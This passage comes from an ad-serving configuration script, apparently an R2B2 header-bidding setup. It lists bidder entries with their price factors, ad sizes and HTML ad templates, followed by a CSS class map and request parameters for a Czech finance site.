              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <div style=' '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 90%;max-height: 120px;width: auto;height: auto;' \/> <\/div> <div style='padding: 0 30px;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding: 0.3em 0 0.5em;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a> ",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 70,
                "maxTitleLength": 40,
                "maxDescLength": 90
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 166121,
          "tag": "smart-hb-native",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "394820-1350874-102161"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 13,
          "height": 31
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "bfc": 1.1111111111111112,
        "factorFixed": 24.53024579306285,
        "styles": {
          "normal": {
            "name": "n-j-1-widesquare_default-56737",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 480px;height: 300px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;' ><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 7%;margin: 0 auto;text-align: center;display: table;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <div style=' '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 90%;max-height: 120px;width: auto;height: auto;' \/> <\/div> <div style='padding: 0 30px;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding: 0.3em 0 0.5em;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a> ",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 70,
                "maxTitleLength": 40,
                "maxDescLength": 90
              }
            }
          },
          "product": {
            "name": "p-j-1-widesquare_default-56737",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 480px;height: 300px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;' ><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 7%;margin: 0 auto;text-align: center;display: table;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <div style=' '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 90%;max-height: 120px;width: auto;height: auto;' \/> <\/div> <div style='padding: 0 30px;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding: 0.3em 0 0.5em;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a> ",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 70,
                "maxTitleLength": 40,
                "maxDescLength": 90
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 548029,
          "tag": "seznam-ssp-hb2",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "296573"
          },
          "unmaskedDomain": false,
          "currency": "CZK",
          "priceType": "gross",
          "s2s": false,
          "width": 480,
          "height": 300,
          "sizes": [[320, 100], [300, 300], [300, 250]]
        },
        "floor": 0,
        "factor": 1,
        "factorFixed": 1,
        "styles": {
          "normal": {
            "name": "n-j-1-widesquare_default-56737",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 480px;height: 300px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;' ><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 7%;margin: 0 auto;text-align: center;display: table;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <div style=' '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 90%;max-height: 120px;width: auto;height: auto;' \/> <\/div> <div style='padding: 0 30px;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding: 0.3em 0 0.5em;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a> ",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 70,
                "maxTitleLength": 40,
                "maxDescLength": 90
              }
            }
          },
          "product": {
            "name": "p-j-1-widesquare_default-56737",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 480px;height: 300px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;' ><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 7%;margin: 0 auto;text-align: center;display: table;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <div style=' '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 90%;max-height: 120px;width: auto;height: auto;' \/> <\/div> <div style='padding: 0 30px;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding: 0.3em 0 0.5em;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a> ",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 70,
                "maxTitleLength": 40,
                "maxDescLength": 90
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 787427,
          "tag": "adaptmx-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "hb_480x300_(ii.finance.cz)_-_Zero"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 480,
          "height": 300,
          "sizes": [[300, 250], [300, 300], [336, 280], [320, 100], [320, 50], [250, 250], [300, 100], [336, 300], [200, 200], [320, 150], [432, 108], [451, 93], [360, 300], [320, 130]]
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": []
      }, {
        "chd": {
          "id": 788583,
          "tag": "onetag",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "hb_480x300_ii_finance_cz_-_Zero"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 480,
          "height": 300,
          "sizes": [[300, 250], [300, 300], [336, 280], [320, 100], [320, 50], [250, 250], [300, 100], [336, 300], [200, 200], [320, 150], [432, 108], [451, 93], [360, 300], [320, 130]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": []
      }],
      "s2s": false
    }]
  },
  "cls": {
    "headline": "AdTrack-headline",
    "description": "AdTrack-description",
    "adChoices": "AdTrack-adChoices",
    "date": "AdTrack-date",
    "ad": "AdTrack-ad-*",
    "ads": "AdTrack-ads",
    "container": "AdTrack-container",
    "promoTitle": "AdTrack-promoTitle",
    "promoIcon": "AdTrack-promoIcon",
    "promoClick": "AdTrack-promoClick",
    "closeTitle": "AdTrack-closeTitle",
    "closeClick": "AdTrack-closeClick",
    "creative1": "AdTrack-creative1",
    "creative2": "AdTrack-creative2",
    "creative3": "AdTrack-creative3",
    "creative23": "AdTrack-creative23",
    "creative123": "AdTrack-creative123",
    "bannerUrl": "AdTrack-bannerUrl",
    "bannerRel": "AdTrack-bannerRel",
    "adUrl": "AdTrack-adUrl",
    "clickUrl": "AdTrack-clickUrl-*",
    "visibleUrl": "AdTrack-visibleUrl",
    "longHeadline": "AdTrack-longHeadline",
    "companyName": "AdTrack-companyName",
    "logoUrl": "AdTrack-logoUrl",
    "squareLogoUrl": "AdTrack-squareLogoUrl",
    "screenshot": "AdTrack-screenshot",
    "screenshothq": "AdTrack-screenshothq",
    "favicon": "AdTrack-favicon",
    "cta": "AdTrack-cta",
    "imageUrl": "AdTrack-imageUrl",
    "category": "AdTrack-category",
    "logoutUrl": "AdTrack-logoutUrl",
    "title": "AdTrack-title",
    "manufacturer": "AdTrack-manufacturer",
    "price": "AdTrack-price",
    "lastPrice": "AdTrack-lastPrice",
    "discount": "AdTrack-discount",
    "condition": "AdTrack-condition",
    "additionalInfo": "AdTrack-additionalInfo",
    "productDescription": "AdTrack-productDescription",
    "shopName": "AdTrack-shopName",
    "shopSlogan": "AdTrack-shopSlogan",
    "shopUrl": "AdTrack-shopUrl",
    "shopLogoUrl": "AdTrack-shopLogoUrl",
    "cleanShopUrl": "AdTrack-cleanShopUrl",
    "confirmImpUrl": "AdTrack-confirmImpUrl",
    "productTextTemplate": "AdTrack-productTextTemplate"
  },
  "test": false
}, null, "delivery.r2b2.cz", null, {
  "timeout": 10000,
  "visitor": {
    "countryISO": "JP",
    "gdpr": 0
  },
  "publisher": {
    "id": "32",
    "tag": "ii"
  },
  "ip": "50.7.159.142"
});

// 20.7ms